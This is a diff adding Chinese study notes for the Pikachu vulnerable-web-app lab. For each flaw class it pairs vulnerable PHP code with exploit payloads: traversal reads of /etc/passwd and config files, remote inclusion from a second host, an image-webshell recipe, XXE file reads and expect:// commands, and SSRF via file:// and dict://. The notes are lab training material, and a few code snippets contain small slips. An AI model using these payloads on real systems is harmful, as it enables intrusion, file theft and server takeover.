@@ -11,6 +11,7 @@
 - Microsoft Windows 10 企业版 LTSC - 10.0.17763
 - VMware® Workstation 15 Pro - 15.0.0 build-10134415
 - kali 4.19.0-kali3-amd64
+- pikachu - Commits on Feb 9, 2019
 
 ---
 
@@ -24,11 +25,9 @@
 - [第八周作业 1.CSRF漏洞概述及原理 2.通过CSRF进行地址修改 3.token是如何防止CSRF漏洞？4.远程命令、代码执行漏洞原理及演示](https://blog.csdn.net/weixin_43899561/article/details/89742243)
 - [insert、update和delete 注入方法](https://blog.csdn.net/qq1124794084/article/details/84590929)
 - [SQL注入：宽字节注入（GBK双字节绕过）](https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/)
-
-
-
-
-
+- [浅谈XXE攻击](https://www.freebuf.com/articles/web/126788.html)
+- [第十周作业 1.漏洞越权原理：水平越权，垂直越权 2.php反序列化 3.xxe漏洞原理 4.ssrf漏洞](https://blog.csdn.net/weixin_43899561/article/details/90745005)
+- [浅析SSRF原理及利用方式](https://www.anquanke.com/post/id/145519)
 
 ---
 
@@ -41,6 +40,7 @@
 ---
 
 ## Burte Force
+
 “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。
 
 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：
@@ -278,6 +278,7 @@ burp 抓个正确的包,将以下两个设置为变量
 ---
 
 ## XSS
+
 Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称 XSS。一般XSS可以分为如下几种常见类型：
 1. 反射性XSS;
 2. 存储型XSS;
@@ -328,6 +329,7 @@ F12 修改前端数量限制，输入 payload `<script>alert('沵咑礷赇潒礤
 刷新一次后就不会进行弹窗，说这仅仅是一次性。
 
 ### 反射性xss(post)
+
 POST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。
 
 **服务器端核心代码**
@@ -629,6 +631,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
     虽然退出或者关闭了浏览器，但存在本地的cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变的简单
 
 ### CSRF(get)
+
 首先进行登陆，修改一下个人信息，并到 Brup Suite 上进行抓包，将抓到的 URL 进行修改(由自己作为攻击者)，再发送给攻击目标(由自己作为被攻击者)
 
 ![image](../../../img/渗透/实验/pikachu/19.png)
@@ -642,6 +645,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 ![image](../../../img/渗透/实验/pikachu/20.png)
 
 ### CSRF(POST)
+
 同样，登陆，修改一下个人信息，并到Brup Suite上进行抓包，对于POST型，请求已经不能通过修改URL来借用用户权限，那么需要自己做一个表单，再返回到提交页面来完成修改。
 
 **漏洞利用**
@@ -681,6 +685,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 ---
 
 ## Sql Inject
+
 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
 `一个严重的SQL注入漏洞，可能会直接导致一家公司破产！`
 
@@ -904,6 +909,7 @@ if(isset($_GET['submit']) && $_GET['name']!=null){
 payload: `' or '1' = '1 #`
 
 ### "insert/update"注入
+
 insert 注入，就是前端注册的信息最终会被后台通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接拼接 SQL 到后端的 insert 相关内容中，导致了 insert 注入。
 
 **服务器端核心代码**
@@ -1050,6 +1056,7 @@ if(isset($_GET['logout']) && $_GET['logout'] == 1){
 后面略
 
 ### 盲注(base on boolian)
+
 盲注就是在 sql 注入过程中，sql 语句执行的选择后，报错的数据不能回显到前端页面（后台使用了错误消息屏蔽方法屏蔽了报错）。在无法通过返回的信息进行 sql 注入时，采用一些方法来判断表名长度、列名长度等数据后来爆破出数据库数据的的这个过程称为盲注。
 
 **服务器端核心代码**
@@ -1179,6 +1186,7 @@ id 的参数传入代码层，就会在 `’` 前加一个 `\`，由于采用的
 ---
 
 ## RCE
+
 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口
 
@@ -1237,6 +1245,7 @@ if(isset($_POST['submit']) && $_POST['txt'] != null){
 ---
 
 ## File Inclusion
+
 文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
 - include(),include_once()
 - require(),require_once()
@@ -1247,48 +1256,514 @@ if(isset($_POST['submit']) && $_POST['txt'] != null){
 
 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。
 
+### 本地文件包含
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['filename']!=null){
+    $filename=$_GET['filename'];
+    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
+//     //安全的写法,使用白名单，严格指定包含的文件名
+//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){
+//         include "include/$filename";
 
+//     }
+}
+```
 
+**漏洞利用**
 
+查看页面的 url: `http://<服务器IP!!!>/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&submit=提交`
 
+尝试构造 payload: `http://<服务器IP!!!>/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&submit=%E6%8F%90%E4%BA%A4`
 
+### 远程文件包含
+将 allow_url_include 设置为 On
 
+**服务器端核心代码**
+```php
+//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置
+if(isset($_GET['submit']) && $_GET['filename']!=null){
+    $filename=$_GET['filename'];
+    include "$filename";//变量传进来直接包含,没做任何的安全限制
+}
+```
+
+**漏洞利用**
+
+尝试构造 payload: `http://<服务器IP!!!>/pikachu/vul/fileinclude/fi_remote.php?filename=http://<服务器B IP!!!>/phpinfo.php&submit=%E6%8F%90%E4%BA%A4`
 
 ---
 
 ## Unsafe Filedownload
 
+文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。
+此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。
+
+所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！
+
+**漏洞利用**
+
+构造payload: `http://<服务器IP!!!>/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php`
+
 ---
 
 ## Unsafe Fileupload
 
+文件上传功能在 web 应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。
+
+所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：
+- 验证文件类型、后缀名、大小;
+- 验证文件的上传方式;
+- 对文件进行一定复杂的重命名;
+- 不要暴露文件上传后的路径;
+- 等等...
+
+### client check
+**服务器端核心代码**
+```php
+if(isset($_POST['submit'])){
+//     var_dump($_FILES);
+    $save_path='uploads';//指定在当前目录建立一个目录
+    $upload=upload_client('uploadfile',$save_path);//调用函数
+    if($upload['return']){
+        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
+    }else{
+        $html.="<p class=notice>{$upload['error']}</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+说只允许上传图片文件，那么查看前端代码，当页面发生改变时，会调用这个checkFileExt函数来检查上传的是不是图片
+
+![image](../../../img/渗透/实验/pikachu/59.png)
+
+这里可以把文件先改成图片的后缀名，然后抓包修改后缀上传
+
+![image](../../../img/渗透/实验/pikachu/60.png)
+
+### MIME type
+
+**什么是 MIME**
+最早的 HTTP 协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言 HTML 文档，而为了支持多媒体数据类型，HTTP 协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。
+
+MIME意为多目 Internet 邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被 HTTP 协议支持之后，它的意义就更为显著了。它使得 HTTP 传输的不仅是普通的文本，而变得丰富多彩。
+
+每个 MIME 类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 image 等，后面定义具体的种类。
+
+常见的 MIME 类型
+- 超文本标记语言文本 .html,.html text/html
+- 普通文本 .txt text/plain
+- RTF 文本 .rtf application/rtf
+- GIF 图形 .gif image/gif
+- JPEG 图形 .ipeg,.jpg image/jpeg
+- au 声音文件 .au audio/basic
+- MIDI 音乐文件 mid,.midi audio/midi,audio/x-midi
+- RealAudio 音乐文件 .ra, .ram audio/x-pn-realaudio
+- MPEG 文件 .mpg,.mpeg video/mpeg
+- AVI 文件 .avi video/x-msvideo
+- GZIP 文件 .gz application/x-gzip
+- TAR 文件 .tar application/x-tar
+
+Internet 中有一个专门组织 IANA 来确认标准的 MIME 类型，但 Internet 发展的太快，很多应用程序等不及 IANA 来确认他们使用的 MIME 类型为标准类型。因此他们使用在类别中以 x- 开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar 等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个 MIME 类型，即使它是不标准的类型也没有关系，客户程序就能根据 MIME 类型，采用具体的处理手段来处理数据。而Web服务器和浏览器（包括操作系统）中，缺省都设置了标准的和常见的 MIME 类型，只有对于不常见的 MIME 类型，才需要同时设置服务器和客户浏览器，以进行识别。
+
+由于 MIME 类型与文档的后缀相关，因此服务器使用文档的后缀来区分不同文件的 MIME 类型，服务器中必须定义文档后缀和 MIME 类型之间的对应关系。而客户程序从服务器上接收数据的时候，它只是从服务器接受数据流，并不了解文档的名字，因此服务器必须使用附加信息来告诉客户程序数据的 MIME 类型。服务器在发送真正的数据之前，就要先发送标志数据的 MIME 类型的信息，这个信息使用 Content-type 关键字进行定义，例如对于 HTML 文档，服务器将首先发送以下两行 MIME 标识信息,这个标识并不是真正的数据文件的一部分。
+
+Content-type: text/html
+
+注意，第二行为一个空行，这是必须的，使用这个空行的目的是将 MIME 信息与真正的数据内容分隔开。
+
+**服务器端核心代码**
+```php
+if(isset($_POST['submit'])){
+//     var_dump($_FILES);
+    $mime=array('image/jpg','image/jpeg','image/png');//指定MIME类型,这里只是对MIME类型做了判断。
+    $save_path='uploads';//指定在当前目录建立一个目录
+    $upload=upload_sick('uploadfile',$mime,$save_path);//调用函数
+    if($upload['return']){
+        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
+    }else{
+        $html.="<p class=notice>{$upload['error']}</p>";
+    }
+}s
+```
+
+**漏洞利用**
+
+这里分别上传一个图片和一个txt文本，用burp进行抓包，分别观察两种不同的 Content-Type
+
+1. Content-Type: image/jpeg
+2. Content-Type: text/plain
+
+这里将 txt 的 Content-Type 改为图片的 Content-Type ，测试，成功上传
+
+![image](../../../img/渗透/实验/pikachu/61.png)
+
+### getimagesize
+
+**服务器端核心代码**
+```php
+if(isset($_POST['submit'])){
+    $type=array('jpg','jpeg','png');//指定类型
+    $mime=array('image/jpg','image/jpeg','image/png');
+    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
+    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
+    if($upload['return']){
+        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
+    }else{
+        $html.="<p class=notice>{$upload['error']}</p>";
+
+    }
+}
+```
+
+**漏洞利用**
+
+这里可以利用文件包含+文件头欺骗进行 getshell
+
+做个图片马 `copy 11111.png/b+1.php/a shell5.png`
+
+burp转发上传
+
+![image](../../../img/渗透/实验/pikachu/62.png)
+
+蚁剑连接
+
+![image](../../../img/渗透/实验/pikachu/63.png)
+
 ---
 
 ## Over Permission
+如果使用 A 用户的权限去操作 B 用户的数据，A 的权限小于 B 的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。
+一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。
+因此，在在权限管理中应该遵守：
+1. 使用最小权限原则对用户进行赋权;
+2. 使用合理（严格）的权限校验规则;
+3. 使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件
+
+### 水平越权
+
+**漏洞利用**
+
+观察链接，发现用户名是通过 URL 提交的，直接修改 URL 里的用户名可以访问其他用户的信息
+
+### 垂直越权
+
+**漏洞利用**
+
+用 admin 登录一下，创建个账号 123456，然后退出，账号用 pikachu 登录，将之前创建账号 123 的请求在 burp 里转发，用 pikachu 的 cookie 覆盖之前 admin 的 cookie，可以发现 123 被重复创建了
+
+![image](../../../img/渗透/实验/pikachu/64.png)
 
 ---
 
-## ../../目录遍历
+## ../../ 目录遍历
+
+在 web 功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过 `../` 这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。
+
+看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。
+
+需要区分一下的是,如果你通过不带参数的 url（比如：http://xxxx/doc）列出了 doc 文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。而并不归为目录遍历漏洞。
+
+**漏洞利用**
+
+payload: `http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../../../1.txt`
+
+![image](../../../img/渗透/实验/pikachu/75.png)
+
+linux payload: `http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../../../etc/passwd`
 
 ---
 
 ## 敏感信息泄露
 
+由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：
+- 通过访问url下的目录，可以直接列出目录下的文件列表;
+- 输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
+- 前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;
+
+类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。
+
+**漏洞利用**
+
+直接 F12 查看源代码
+
+![image](../../../img/渗透/实验/pikachu/74.png)
+
 ---
 
 ## PHP反序列化
+
+在理解这个漏洞前,你需要先搞清楚 php 中 `serialize()` ，`unserialize()` 这两个函数。
+
+**序列化 serialize()**
+
+序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:
+```php
+<?php
+class S{
+    public $test="pikachu";
+}
+$s=new S(); //创建一个对象
+serialize($s); //把这个对象进行序列化
+print_r(serialize($s));
+?>
+
+序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
+    O:代表object
+    1:代表对象名字长度为一个字符
+    S:对象的名称
+    1:代表对象里面有一个变量
+    s:数据类型
+    4:变量名称的长度
+    test:变量名称
+    s:数据类型
+    7:变量值的长度
+    pikachu:变量值
+```
+
+**反序列化 unserialize()**
+
+就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。
+```php
+$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
+echo $u->test; //得到的结果为pikachu
+```
+
+序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题
+
+常见的几个魔法函数:
+```
+__construct() 当一个对象创建时被调用
+
+__destruct() 当一个对象销毁时被调用
+
+__toString() 当一个对象被当作一个字符串使用
+
+__sleep() 在对象在被序列化之前运行
+
+__wakeup 将在序列化之后立即被调用
+```
+
+漏洞举例:
+```php
+class S{
+    var $test = "pikachu";
+    function __destruct(){
+        echo $this->test;
+    }
+}
+$s = $_GET['test'];
+@$unser = unserialize($a);
+
+payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
+```
+
+**服务器端核心代码**
+```php
+class S{
+    var $test = "pikachu";
+    function __construct(){
+        echo $this->test;
+    }
+}
+
+if(isset($_POST['o'])){
+    $s = $_POST['o'];
+    if(!@$unser = unserialize($s)){
+        $html.="<p>大兄弟,来点劲爆点儿的!</p>";
+    }else{
+        $html.="<p>{$unser->test}</p>";
+    }
+
+}
+```
+
+**漏洞利用**
+
+首先需要 PHP 中自己定义一个变量，并将该变量写为一个恶意代码并将其序列化，访问写好的 php 文件并查看源代码将序列化好的代码复制下来作为 payload
+
+在线反序列化工具: https://www.w3cschool.cn/tools/index?name=unserialize
+
+payload: `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
+
+![image](../../../img/渗透/实验/pikachu/65.png)
+
+回到平台提交 payload 就会触发弹窗
+
+![image](../../../img/渗透/实验/pikachu/66.png)
 
 ---
 
 ## XXE
 
+**什么是 XML 外部实体**
+
+如果你了解 XML，你可以把 XML 理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过 XML 进行通信和交换数据。 比如，下图就是一个用来描述一个职工的 XML 文档样本，其中的’name’,'salary’,'address’ 被称为 XML 的元素。
+
+![image](../../../img/渗透/实验/pikachu/67.png)
+
+有些 XML 文档包含 system 标识符定义的“实体”，这些 XML 文档会在 DOCTYPE 头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的 XML 文档样例就包含了XML ‘实体’。
+
+![image](../../../img/渗透/实验/pikachu/68.png)
+
+在上面的代码中， XML 外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析 XML 文档的过程中，实体’entityex’的值会被替换为 URI(file://etc/passwd)内容值（也就是 passwd 文件的内容）。 关键字’SYSTEM’会告诉 XML 解析器，’entityex’实体的值将从其后的 URI 中读取。因此，XML 实体被使用的次数越多，越有帮助。
+
+**XXE**
+
+XXE -"xml external entity injection"既"xml外部实体注入漏洞"。有了 XML 实体，关键字’SYSTEM’会令 XML 解析器从 URI 中读取内容，并允许它在 XML 文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制 XML 解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上 folder/file 的内容并呈献给用户。
+
+![image](../../../img/渗透/实验/pikachu/69.png)
+
+概括一下就是"攻击者通过向服务器注入指定的 xml 实体内容,从而让服务器按照指定的配置进行执行,导致问题",也就是说服务端接收和解析了来自用户端的 xml 数据,而又没有做严格的安全控制,从而导致 xml 外部实体注入。
+
+**服务器端核心代码**
+```PHP
+if(isset($_POST['submit']) and $_POST['xml'] != null){
+    $xml =$_POST['xml'];
+//    $xml = $test;
+    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
+    if($data){
+        $html.="<pre>{$data}</pre>";
+    }else{
+        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+输入 paylaod,就会弹出设置的值
+```XML
+<?xml version = "1.0"?>
+<!DOCTYPE note [
+    <!ENTITY hacker "admin">
+]>
+<name>&hacker;</name>
+```
+
+![image](../../../img/渗透/实验/pikachu/70.png)
+
+payload,请先确定目标路径有这个文件
+```xml
+<?xml version = "1.0"?>
+<!DOCTYPE note [
+<!ENTITY aaa SYSTEM "file:///c:/1.txt">]>
+<name>&aaa;</name>
+```
+
+![image](../../../img/渗透/实验/pikachu/71.png)
+
+在 linux 下还可以输入这样的 payload
+```XML
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+    <!ENTITY f SYSTEM "expect://ipconfig">
+]>
+<x>&f;</x>
+```
+
 ---
 
 ## URL重定向
+
+不安全的 url 跳转问题可能发生在一切执行了 url 地址跳转的地方。
+如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的 url 地址)参数作为了跳转的目的地,而又没有做判断的话
+就可能发生"跳错对象"的问题。
+
+url跳转比较直接的危害是: 钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站,一般的流程是,跳转漏洞-->钓鱼页面-->提交用户名密码-->跳转回来
+
+**服务器端核心代码**
+```php
+if(isset($_GET['url']) && $_GET['url'] != null){
+    $url = $_GET['url'];
+    if($url == 'i'){
+        $html.="<p>好的,希望你能坚持做你自己!</p>";
+    }else {
+        header("location:{$url}");
+    }
+}
+```
+
+**漏洞利用**
+
+payload: `http://<IP address !!!>/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com`
 
 ---
 
 ## SSRF
 
+其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据
 
+数据流:攻击者----->服务器---->目标地址
 
+根据后台使用的函数的不同,对应的影响和利用方法又有不一样
+PHP中下面函数的使用不当会导致SSRF:
+- file_get_contents()
+- fsockopen()
+- curl_exec()
+
+如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,则请做好目标地址的过滤。
+
+### SSRF(curl)
+
+**服务器端核心代码**
+```php
+if(isset($_GET['url']) && $_GET['url'] != null){
+    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
+    $URL = $_GET['url'];
+    $CH = curl_init($URL);
+    curl_setopt($CH, CURLOPT_HEADER, FALSE);
+    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
+    $RES = curl_exec($CH);
+    curl_close($CH) ;
+//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
+//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
+//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
+    echo $RES;
+}
+```
+
+扩展阅读: [PHP中使用CURL实现GET和POST请求](https://www.cnblogs.com/CHEUNGKAMING/p/5717429.html)
+
+**漏洞利用**
+
+观察 url: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php`
+
+看起来就像远程包含漏洞一样，尝试构造 payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com`
+
+![image](../../../img/渗透/实验/pikachu/72.png)
+
+SSRF 利用方式有很多,比较常见的是服务端请求其他网站,一种是探测内网敏感信息,还有就是攻击 web 应用,主要是 strust2 远程命令执行,还有一些中间件的 getshell.
+
+payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/1.txt`
+
+payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:80/info`
+
+![image](../../../img/渗透/实验/pikachu/73.png)
+
+### SSRF(file_get_content)
+
+**服务器端核心代码**
+```php
+if(isset($_GET['file']) && $_GET['file'] !=null){
+    $filename = $_GET['file'];
+    $str = file_get_contents($filename);
+    echo $str;
+}
+```
+
+- **file_get_contents() 函数**
+
+    file() 函数把整个文件读入一个数组中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
+
+    file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
+
+**漏洞利用**
+
+观察url: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php`
+
+看上去没什么变化，试试构造 payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=http://www.baidu.com`
+
+payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/1.txt`
